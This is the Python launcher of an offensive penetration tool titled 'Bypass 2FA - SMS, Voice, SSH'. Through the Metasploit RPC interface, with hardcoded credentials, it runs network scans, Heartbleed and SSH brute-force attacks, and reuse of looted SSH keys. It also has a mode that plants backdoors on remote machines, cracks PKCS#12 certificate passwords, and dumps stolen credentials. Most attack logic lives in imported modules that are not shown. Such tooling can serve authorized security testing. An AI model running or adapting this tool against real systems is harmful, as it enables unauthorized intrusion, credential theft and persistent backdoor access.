#!/usr/bin/env python


import argparse
import sys, os, time
import pickle
import msfrpc
import time
from glob import glob
from post import prepare, pka
from cert.transport import control
from cert.analysis import detest
from crack.pkcs12 import win
from check.vuln.pub import stat
import subprocess
import webbrowser

def advanced(ip_input):
    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']
    a = client.call('console.write', [console_id, "db_nmap -f --iflist %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -v -O --osscan-guess %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -PA -PS -PO -PU %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -sT %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap --reason %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_input])
    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "services \n"])
    time.sleep(1)

    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

        cleanup = client.call('console.destroy',[console_id])
        print "Cleanup result: %s" %cleanup['result']
        exit()


def scan(ip_addr):

    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']
    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_addr])
    time.sleep(1)

    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

        cleanup = client.call('console.destroy',[console_id])
        print "Cleanup result: %s" %cleanup['result']
        exit()


def mainmenu():
    #os.system('date')
    print "Done."
print ('''

 ___ ___ _                      _
|_  ) __/_\   ______ __ _ _____(_)_ _
 / /| _/ _ \ (_-<_-</ _` (_-<_-< | '  \+v2
/___|_/_/ \_\/__/__/\__,_/__/__/_|_||_|

''')

parser = argparse.ArgumentParser(description='Bypass 2FA - SMS, Voice, SSH')

parser.add_argument('--target',
    #action="store_true",
    help="IP Address" )

parser.add_argument('--silent',
    action="store_true",
    help="reduce output verbosity" )

parser.add_argument('--scan',
    help="Network enumeration { basic | advanced }")

parser.add_argument('--check',
    help="Check for vulnerabilities, modules")

parser.add_argument('--cert',
    help="Certificate management")

parser.add_argument('--filetype',
    help="Specify file *.extension")

parser.add_argument('--user',
    help="username")

parser.add_argument('--secret',
        help="password")

parser.add_argument('--host',
            help="server ip")

parser.add_argument('--mode',
            help="mode")

parser.add_argument('--auto',
    help="auto mode for automation")

parser.add_argument('--post',
    help="post modules")

parser.add_argument('--db',
    help="Manage your trophies.")

parser.add_argument('--key',
    help="keys management")

parser.add_argument('--log',
    help="View logs")

args = parser.parse_args()


modulename = 'msfrpc'
if modulename not in sys.modules:
    print 'Where is the package? Please import the {} module'.format(modulename)

if args.scan == "basic":
    ip_addr = args.target
    print "You selected BASIC scan. \n"
    try:
        scan(ip_addr)
    except:
        print "something is wrong with basic scan!"
        pass

elif args.scan == "advanced":
    ip_input = args.target
    print "You selected ADVANCED scan. \n"
    try:
        advanced(ip_input)
    except:
        print "something is wrong with advanced scan!"
    sys.exit(0)


if args.check == "heartbleed" and args.mode == "attack":
      print "\n ... Start Heartbleed Attacks ... \n\n"
      for _ in range(3):
          try:
              os.system("msfconsole -q -r ./check/vuln/heartburn/heartbleed")
          except:
              print ""
          sys.exit(0)

if args.check == "ssh" and args.mode == "attack":
      print "\n ... Start SSH Brute Force Attacks ... \n\n"
      cmd = ""
      cmd += "msfconsole -q -r ./check/vuln/brute/brute"
      cmd += ";"
      #cmd += "msfconsole -q -r ./scan/brute.rc >/dev/null"
      #cmd += "msfconsole -q -r ./scan/brute.rc 2>&1 >/dev/null"
      os.system(cmd)
      sys.exit(0)

if args.check == "ssh" and args.mode == "auth":
    print "Access machines with looted keys! \n"
    print "Preparing user file ... ... \n"
    prepare.looted_user()
    print "Let system cool down ... ... \n"
    time.sleep(5)
    prepare.clarify(); time.sleep(3)
    prepare.root()
    cmd = ""
    cmd += "msfconsole -q -r ./check/vuln/pub/reauth"
    os.system(cmd)
    time.sleep(3)
    print "\n ... Gathering Statistics from 'authorized_keys' ...\n"
    print "\n ##### These users can access to other machines via public key authentication: ######\n"
    stat.userxxx()
    print "\n ... User accessibity were found on these machines: \n"
    stat.machinexxx()
    sys.exit(0)


if args.check == "ssh" and args.mode == "backdoor":
    print "Backdooring remote machines! \n"
    pka.prep(); time.sleep(2)
    pka.process(); time.sleep(2)
    pka.add_backdoor(); time.sleep(2)
    pka.clean()
    sys.exit(0)


if args.cert == "analyze" and args.filetype == "pfx":
    print "\n--------- Analyze the PFX file -----------"
    try:
        detest.analyze()
    except:
        print "ERROR: something is wrong, see detest."

if args.cert == "crack" and args.mode == "dic" and args.filetype == "pfx":
    print "\n...... Dictionary Attacks on PKCS#12 ......\n"
    win.crack()
    time.sleep(2)
    try:
        win.median()
    except:
        print "\n Could not remove passwords on client certificate! \n"
    sys.exit()

if args.cert == "crack" and args.mode == "bruteforce" and args.filetype == "pfx":
    print "\n...... Brute Force Attacks on PKCS#12 ......\n"
    win.bruteforce()
    try:
        win.median()
    except:
        print "\n Could not remove passwords on client certificate! \n"
    sys.exit()

if args.cert == "windows":
    first = args.user; second = args.secret; third = args.host
    try:
        control.generate(first, second, third)
    except:
        "ERROR: Script generation failed.\n"
        pass

    cmd = ""
    cmd += "msfconsole -q -r ./cert/transport/instruction/muscle"
    os.system(cmd)
    sys.exit(0)

if args.log == "all":
    webbrowser.open('file:///root/.msf4/loot/', new=2)
    sys.exit(0)
if args.log == "loot":
    client = msfrpc.Msfrpc({});client.login('msf','abc123')
    res = client.call('console.create');console_id = res['id']
    a = client.call('console.write', [console_id, "loot \n"]);time.sleep(1)
    a = client.call('console.write', [console_id, "creds -t password \n"]);time.sleep(1)
    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'];break
            sys.exit(0)

if args.log == "whereis":
    xuser = args.user
    try:
        stat.origin(xuser)
    except:
        "Ooops! User was not found!\n"
        pass
        sys.exit()

if args.log =="account":
    xcomputer = args.host
    try:
        stat.accountxxx(xcomputer)
    except:
        "No account accesibility.\n"
        pass
        sys.exit()


def main():
    try:
        mainmenu()
        #cleanup()
    except KeyboardInterrupt:
        print bcolors.RED+"\nCaught Ctrl-C, GraceFul Exit. POOOF"+bcolors.ENDC


if __name__ == '__main__':
    try:
        main()
    except:
        sys.exit()
